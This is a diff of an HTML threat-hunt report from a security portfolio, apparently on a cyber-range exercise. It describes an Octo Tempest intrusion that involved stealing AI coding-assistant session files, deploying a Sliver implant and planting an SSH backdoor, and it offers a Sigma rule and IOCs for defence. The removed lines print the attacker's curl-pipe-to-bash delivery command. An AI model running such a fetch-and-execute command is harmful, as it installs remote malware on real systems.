@@ -1,119 +1,196 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Silent Corridor — Threat Hunt Report</title>
-<link rel="stylesheet" href="report-theme.css">
-</head><body>
-<div class="site-nav"><a href="case-files.html">&larr; Back to Case Files</a><span class="brand">SAKHO_SEC &middot; SILENT CORRIDOR</span></div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Silent Corridor — Aboubacar Sakho</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' fill='%2308090b'/%3E%3Ctext x='16' y='46' font-family='monospace' font-size='38' font-weight='bold' fill='%23ff4433'%3E%3E%3C/text%3E%3C/svg%3E">
+<meta name="description" content="A confirmed Octo Tempest (Scattered Spider) intrusion — AI session-file theft, a Sliver C2 implant, and four blocked lateral movement attempts. 40/41 flags.">
+<meta property="og:title" content="Silent Corridor — Aboubacar Sakho">
+<meta property="og:description" content="A confirmed Octo Tempest intrusion — AI session-file theft, a Sliver C2 implant, and four blocked lateral movement attempts.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://mrabousakho.github.io/silent-corridor-report.html">
+<meta property="og:image" content="https://mrabousakho.github.io/og-image.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
 
-<div class="cover-simple" style="--accent:#8a5cff;--accent2:#22b6e6">
+<header>
+  <nav>
+    <a href="index.html" class="brand">SAKHO<span class="underscore cur">_</span>SEC</a>
+    <div class="navlinks">
+      <a href="whoami.html" class="linkbox">WHOAMI</a>
+      <a href="case-files.html" class="linkbox">CASE FILES</a>
+      <a href="projects.html" class="linkbox">PROJECTS</a>
+      <a href="ops.html" class="linkbox">OPS</a>
+      <a href="contact.html" class="linkbox">CONTACT</a>
+    </div>
+  </nav>
+</header>
+
+<section class="report-hero">
   <div class="wrap">
-    <div class="eyebrow">Threat Hunt Report &middot; Octo Tempest</div>
-    <div class="ksig"></div>
-    <h1>Silent<br>Corridor</h1>
-    <div class="sub">A confirmed Octo Tempest intrusion, from AI session-file theft to failed lateral pivots.</div>
-    <div class="spacer"></div>
-    <div class="meta">
-      <div><span>Analyst</span><b>Aboubacar Sakho</b></div>
-      <div><span>Threat Actor</span><b>Octo Tempest</b></div>
-      <div><span>Platform</span><b>Azure Sentinel</b></div>
-      <div><span>Window</span><b>Apr 30&ndash;May 1, 2026</b></div>
-      <div><span>Result</span><b class="ok">40 / 41 flags</b></div>
-      <div><span>Classification</span><b>CONFIDENTIAL &middot; Portfolio</b></div>
+    <div style="text-align:center;">
+      <span class="eyebrow-pill" style="color:var(--purple);">&#9679; CONFIRMED THREAT ACTOR &middot; OCTO TEMPEST</span>
+    </div>
+    <h1>SILENT <span class="accent">CORRIDOR</span><span class="cur">_</span></h1>
+    <div class="sub">Live Azure Sentinel &middot; 1,800-Student Cyber Range</div>
+    <p class="desc">A confirmed Octo Tempest (Scattered Spider / UNC3944) intrusion into Azure-connected Linux and Windows infrastructure &mdash; from AI development session-file theft to four blocked lateral-movement attempts, investigated live across 13 telemetry tables and 64,357 events.</p>
+    <div class="stats">
+      <div class="stat"><b>40/41</b><span>Flags Solved</span></div>
+      <div class="stat"><b>104min</b><span>Dwell Time</span></div>
+      <div class="stat"><b>3</b><span>Accounts Compromised</span></div>
+      <div class="stat"><b>64,357</b><span>Events Analyzed</span></div>
     </div>
   </div>
-</div>
+</section>
 
-<div class="body doc">
-
-<section>
-  <div class="eyebrow2" data-n="00">Executive Summary</div>
-  <h2>A confirmed Scattered Spider intrusion</h2>
-  <p class="lead">This report documents the complete investigation of Operation Silent Corridor &mdash; a confirmed Octo Tempest (Scattered Spider / UNC3944) intrusion into Greenfield Operations' Azure-connected Linux and Windows infrastructure. The hunt was conducted live against an Azure Sentinel cyber range with 1,800 students, using the Universal Hunt Agent V4 across 13 telemetry tables and 64,357 events.</p>
-  <p>The threat actor gained initial VPN access via compromised <span class="mono">sancadmin</span> credentials, conducted 42 minutes of preparation, then used a second compromised account (<span class="mono">a.kumar</span>) to deploy a Sliver C2 implant named <span class="mono">helix-update</span> via a curl|bash delivery chain. The implant autonomously exfiltrated Claude AI session files, harvested AWS and Kubernetes credentials, added a backdoor SSH key, and established container-based C2 persistence, before pivoting to Windows infrastructure using stolen credentials.</p>
-
-  <div class="stats">
-    <div><b class="g">40/41</b><span>Flags Solved</span></div>
-    <div><b class="c">104min</b><span>Dwell Time (Implant&rarr;sancadmin)</span></div>
-    <div><b class="a">3</b><span>Accounts Compromised</span></div>
-    <div><b class="r">64,357</b><span>Events Analyzed</span></div>
+<section style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow"><span class="dot"></span> DEEP_DIVE_RESOURCES</div>
+    <div class="icon-grid">
+      <a href="#ioc" class="icon-box">
+        <div class="arrow">&rarr;</div>
+        <div class="ic num" style="color:var(--purple);">12+</div>
+        <h5>IOCs</h5>
+        <span>IPs, domains, hashes</span>
+      </a>
+      <a href="#mitre" class="icon-box">
+        <div class="arrow">&rarr;</div>
+        <div class="ic num" style="color:var(--red);">15+</div>
+        <h5>MITRE ATT&amp;CK</h5>
+        <span>Techniques mapped</span>
+      </a>
+      <a href="#sigma" class="icon-box">
+        <div class="arrow">&rarr;</div>
+        <div class="ic">&#128737;</div>
+        <h5>Sigma Rule</h5>
+        <span>Production detection</span>
+      </a>
+    </div>
   </div>
 </section>
 
-<section>
-  <div class="eyebrow2" data-n="01">Attack Chain</div>
-  <h2>Five phases, one operator</h2>
+<section style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow"><span class="dot"></span> ATTACK CHAIN</div>
+    <h2 class="head">Five Phases, One Operator<span class="cur">_</span></h2>
+    <div class="phase-strip">
+      <div class="phase-card"><div class="num">20:47</div><h4>Preparation</h4><p>sancadmin VPN'd in from AS9009 bulletproof hosting, ran ~30 recon commands on GF-DEV01.</p></div>
+      <div class="phase-card p2"><div class="num">21:29</div><h4>AI Session Theft</h4><p>Read Claude Code and Codex session files &mdash; API keys, credentials, architecture details exposed.</p></div>
+      <div class="phase-card p3"><div class="num">21:54</div><h4>C2 Deployment</h4><p>curl|bash deployed a 15MB Sliver implant named "helix-update" to blend with the target app.</p></div>
+      <div class="phase-card p4"><div class="num">22:57</div><h4>Persistence</h4><p>Backdoor SSH key added with comment "octotempest@operator" &mdash; the operator's own signature.</p></div>
+    </div>
 
-  <div class="phase"><div class="num">01</div><div><div class="ph">Preparation &middot; 20:47&ndash;21:29 UTC</div><h3>VPN entry &amp; reconnaissance</h3><p>sancadmin VPN'd into GF-VPN01 from 194.36.110.139 (AS9009/M247 bulletproof hosting), SSH'd to GF-DEV01, and ran ~30 recon commands: hostname, id, whoami, .env reads, Docker version checks.</p></div></div>
-
-  <div class="phase"><div class="num">02</div><div><div class="ph">Initial Access &middot; 21:29&ndash;21:54 UTC</div><h3>The AI session-file theft</h3><p>Switching to a.kumar, the attacker read two AI development session files &mdash; a Claude Code session and a Codex session &mdash; containing API keys, credentials, and architecture details. A novel attack vector targeting AI-assisted development workflows.</p></div></div>
-
-  <div class="phase"><div class="num">03</div><div><div class="ph">C2 Deployment &middot; 21:54&ndash;22:10 UTC</div><h3>Sliver implant, named to blend in</h3><p><span class="mono">curl -fsSL https://dl.abordsecurity.space/install.sh | bash</span> deployed a 15MB Sliver C2 implant named <span class="mono">helix-update</span> &mdash; deliberately mimicking the target application's own naming.</p></div></div>
-
-  <div class="phase"><div class="num">04</div><div><div class="ph">Persistence &middot; 22:57 UTC</div><h3>Attribution left behind</h3><p>A backdoor SSH key was written with comment <span class="mono">octotempest@operator</span> &mdash; the operator's own persona identifier, and the single strongest attribution signal in the entire investigation.</p></div></div>
-
-  <div class="phase"><div class="num">05</div><div><div class="ph">Lateral Movement &middot; 23:39&ndash;01:14 UTC</div><h3>Four techniques, all blocked</h3><p>Via a Ligolo-ng tunnel, the attacker attempted SMB, WinRM, and WMI lateral movement to GF-WS01 using stolen t.harris credentials. Every attempt failed &mdash; Microsoft Defender for Cloud's agentless scanning caught the dropped hacktool before execution.</p></div></div>
+    <div class="scenario-box" style="border-left-color:var(--purple);">
+      <div class="tag-label" style="color:var(--purple);">&#9889; NOVEL ATTACK VECTOR</div>
+      <p>Two AI development session files were read &mdash; a Claude Code session and a Codex session &mdash; containing API keys, credentials, and architecture details from AI-assisted development workflows. This targets a new class of exposure most organizations haven't accounted for yet.</p>
+    </div>
+  </div>
 </section>
 
-<section>
-  <div class="eyebrow2" data-n="02">Detection Engineering</div>
-  <h2>The Sigma rule that came out of it</h2>
-  <div class="code"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">sigma rule</span></div>
-  <pre>title: Sliver implant execution via nohup reparenting
-status: stable
-description: Detects Sliver C2 implant launched via nohup with systemd as parent (PPID 1)
-logsource:
-  service: audit
+<section id="sigma" style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--blue);"><span class="dot" style="background:var(--blue); box-shadow:0 0 8px var(--blue);"></span> LATERAL MOVEMENT</div>
+    <h2 class="head">Four Techniques, All Blocked<span class="cur">_</span></h2>
+    <p class="sub" style="max-width:680px;">Via a Ligolo-ng tunnel, the attacker attempted SMB, WinRM, and WMI lateral movement to GF-WS01 using stolen t.harris credentials. Every attempt failed &mdash; Microsoft Defender for Cloud's agentless scanning caught the dropped hacktool before execution.</p>
+
+    <div class="query-card" style="border-left-color:var(--purple);">
+      <div class="qhead"><h4>Sigma Detection Rule</h4><span class="tag">T1543.002</span></div>
+      <pre>title: Sliver implant execution via nohup reparenting
 detection:
   selection:
     Image|endswith: '/helix-update'
     ParentImage|endswith: '/sbin/init'
   condition: selection
-level: critical
-tags: [attack.persistence, attack.t1543.002, attack.t1055]</pre></div>
-  <p>A process in /tmp with ParentImage /sbin/init (PPID 1) indicates deliberate nohup detachment &mdash; near-zero false positive rate. Any production hit is a confirmed implant runtime.</p>
-</section>
-
-<section>
-  <div class="eyebrow2" data-n="03">Detection Gap Analysis</div>
-  <h2>The alert that got closed wrong</h2>
-  <p>Nine alerts fired during the incident window and were closed as false positives by Tier 1. One was a critical misclassification:</p>
-  <div class="call crit">
-    <div class="h">CLOSED-5 &mdash; Misclassified as Baseline</div>
-    <p>A DNS query to <span class="mono">dl.abordsecurity.space</span> (21:50&ndash;22:05) was closed as a baseline false positive. It was in fact the C2 delivery domain resolving during the helix-update download. One follow-up query at 21:50 &mdash; identifying the process and what it downloaded &mdash; would have stopped the investigation before the binary executed.</p>
+level: critical</pre>
+      <p>A process in /tmp with ParentImage /sbin/init (PPID 1) indicates deliberate nohup detachment &mdash; near-zero false positive rate.</p>
+    </div>
   </div>
 </section>
 
-<section>
-  <div class="eyebrow2" data-n="04">Threat Attribution</div>
-  <h2>High confidence: Octo Tempest</h2>
-  <p>Four independent signals converge on a single known actor:</p>
-  <div class="twrap"><table>
-    <thead><tr><th>Signal</th><th>Value</th></tr></thead>
-    <tbody>
-      <tr><td>SSH key comment</td><td class="mono">octotempest@operator &mdash; direct persona identifier</td></tr>
-      <tr><td>Hosting provider</td><td>AS9009 / M247 &mdash; known Octo Tempest infrastructure</td></tr>
-      <tr><td>C2 framework</td><td>Sliver, matching published Octo Tempest TTPs</td></tr>
-      <tr><td>Target profile</td><td>Dev workstation, AI sessions, cloud creds, Kubernetes</td></tr>
-    </tbody>
-  </table></div>
-  <p style="color:var(--slate); font-size:13px;">Also tracked as Scattered Spider (CrowdStrike), UNC3944 (Mandiant), 0ktapus (Group-IB).</p>
-</section>
-
-<section>
-  <div class="eyebrow2" data-n="05">Immediate Actions</div>
-  <h2>Critical &mdash; do now</h2>
-  <div class="grid2">
-    <div class="card"><div class="k">Isolate &amp; Preserve</div><p>Isolate GF-DEV01 (active C2 beaconing). Preserve volatile memory before shutdown.</p></div>
-    <div class="card"><div class="k">Reset Credentials</div><p>Reset a.kumar, sancadmin, and t.harris &mdash; the plaintext password is known to the attacker.</p></div>
-    <div class="card"><div class="k">Block at Perimeter</div><p>Block the attacker IP and both abordsecurity.space C2 domains.</p></div>
-    <div class="card"><div class="k">Revoke Cloud Access</div><p>Revoke AWS credentials reachable from GF-DEV01 &mdash; S3 access was confirmed.</p></div>
+<section style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--red);"><span class="dot"></span> DETECTION GAP</div>
+    <h2 class="head">The Alert Closed Wrong<span class="cur">_</span></h2>
+    <div class="card" style="border-left-color:var(--red);">
+      <div class="top-row"><h3>CLOSED-5 &mdash; Misclassified as Baseline</h3><span class="badge critical">MISSED</span></div>
+      <p class="desc">A DNS query to dl.abordsecurity.space was closed as a false positive by Tier 1. It was actually the C2 delivery domain resolving during the implant download. One follow-up query at the time of the alert &mdash; identifying the process and what it downloaded &mdash; would have stopped the investigation before the binary executed.</p>
+    </div>
   </div>
 </section>
 
-<div class="footer">
-  <span>Mr. Sakho Aboubacar &middot; Security Analyst &middot; May 2026</span>
-  <span>Live Azure Sentinel &middot; Universal Hunt Agent V4 &middot; 40/41 flags</span>
-</div>
+<section style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--green);"><span class="dot" style="background:var(--green); box-shadow:0 0 8px var(--green);"></span> ATTRIBUTION</div>
+    <h2 class="head">High Confidence: Octo Tempest<span class="cur">_</span></h2>
+    <div class="icon-grid">
+      <div class="icon-box"><div class="ic">&#128273;</div><h5>SSH Key Comment</h5><span>"octotempest@operator" &mdash; direct persona ID</span></div>
+      <div class="icon-box"><div class="ic">&#127760;</div><h5>Hosting Provider</h5><span>AS9009/M247 &mdash; known infrastructure</span></div>
+      <div class="icon-box"><div class="ic">&#128737;</div><h5>C2 Framework</h5><span>Sliver, matching published TTPs</span></div>
+    </div>
+    <p style="text-align:center; color:var(--muted-2); font-size:12px; margin-top:12px;">Also tracked as Scattered Spider (CrowdStrike), UNC3944 (Mandiant), 0ktapus (Group-IB)</p>
+  </div>
+</section>
 
-</div>
-</body></html>
+<section id="ioc" style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--purple);"><span class="dot" style="background:var(--purple); box-shadow:0 0 8px var(--purple);"></span> INDICATORS_OF_COMPROMISE</div>
+    <h2 class="head">IPs, Domains, and Hashes<span class="cur">_</span></h2>
+    <div class="grid cols-2">
+      <div class="card"><div class="top-row"><h3>194.36.110.139</h3><span class="badge critical">ATTACKER ORIGIN</span></div><p class="desc">VPN entry point for sancadmin and a.kumar &mdash; AS9009/M247 bulletproof hosting.</p></div>
+      <div class="card"><div class="top-row"><h3>dl.abordsecurity.space</h3><span class="badge critical">C2 DOMAIN</span></div><p class="desc">Primary delivery domain &mdash; served install.sh and the helix-update implant.</p></div>
+      <div class="card"><div class="top-row"><h3>sync.abordsecurity.space</h3><span class="badge high">C2 DOMAIN</span></div><p class="desc">Secondary payload domain &mdash; served the Windows lateral-movement implant.</p></div>
+      <div class="card"><div class="top-row"><h3>104.16.0.34</h3><span class="badge high">C2 IP</span></div><p class="desc">Docker container beacon destination &mdash; 30-second interval check-ins.</p></div>
+      <div class="card"><div class="top-row"><h3>5b46244...b924d6</h3><span class="badge critical">FILE SHA1</span></div><p class="desc">helix-update &mdash; the 15MB Sliver C2 implant binary.</p></div>
+      <div class="card"><div class="top-row"><h3>octotempest@operator</h3><span class="badge critical">SSH KEY COMMENT</span></div><p class="desc">Backdoor key comment &mdash; the strongest single attribution signal in the case.</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="mitre" style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--red);"><span class="dot"></span> MITRE_ATTCK</div>
+    <h2 class="head">Full Technique Mapping<span class="cur">_</span></h2>
+    <div class="grid cols-2">
+      <div class="card"><div class="top-row"><h3>External Remote Services</h3><span class="tag mono">T1133</span></div><p class="desc">Initial Access</p></div>
+      <div class="card"><div class="top-row"><h3>Valid Accounts: Local</h3><span class="tag mono">T1078.003</span></div><p class="desc">Initial Access</p></div>
+      <div class="card"><div class="top-row"><h3>Unix Shell</h3><span class="tag mono">T1059.004</span></div><p class="desc">Execution</p></div>
+      <div class="card"><div class="top-row"><h3>Ingress Tool Transfer</h3><span class="tag mono">T1105</span></div><p class="desc">Command &amp; Control</p></div>
+      <div class="card"><div class="top-row"><h3>Systemd Service</h3><span class="tag mono">T1543.002</span></div><p class="desc">Persistence</p></div>
+      <div class="card"><div class="top-row"><h3>SSH Authorized Keys</h3><span class="tag mono">T1098.004</span></div><p class="desc">Persistence</p></div>
+      <div class="card"><div class="top-row"><h3>Credentials in Files</h3><span class="tag mono">T1552.001</span></div><p class="desc">Credential Access</p></div>
+      <div class="card"><div class="top-row"><h3>Cloud Storage Discovery</h3><span class="tag mono">T1530</span></div><p class="desc">Discovery</p></div>
+      <div class="card"><div class="top-row"><h3>SMB/Windows Admin Shares</h3><span class="tag mono">T1021.002</span></div><p class="desc">Lateral Movement</p></div>
+      <div class="card"><div class="top-row"><h3>Windows Remote Management</h3><span class="tag mono">T1021.006</span></div><p class="desc">Lateral Movement</p></div>
+      <div class="card"><div class="top-row"><h3>Protocol Tunneling</h3><span class="tag mono">T1572</span></div><p class="desc">Command &amp; Control</p></div>
+      <div class="card"><div class="top-row"><h3>SAMR Enumeration</h3><span class="tag mono">T1087.002</span></div><p class="desc">Discovery</p></div>
+    </div>
+    <p style="text-align:center; margin-top:16px;"><span class="tag">15 total techniques mapped</span></p>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <div class="foot-brand">SAKHO_SEC</div>
+        <div class="foot-tagline">FIND<span class="r">EVIL</span>.BUILD<span class="r">SYSTEMS</span>.<span class="cur">_</span></div>
+        <div class="foot-sub">Offense. Defense. Code.</div>
+      </div>
+      <div class="foot-social">
+        <a href="https://github.com/mrabousakho" title="GitHub" target="_blank" rel="noopener">&#8981;</a>
+        <a href="https://www.linkedin.com/in/asakho/" title="LinkedIn" target="_blank" rel="noopener">in</a>
+        <a href="mailto:aboubacar.sakho@email.com" title="Email">&#9993;</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="script.js"></script>
+</body>
+</html>
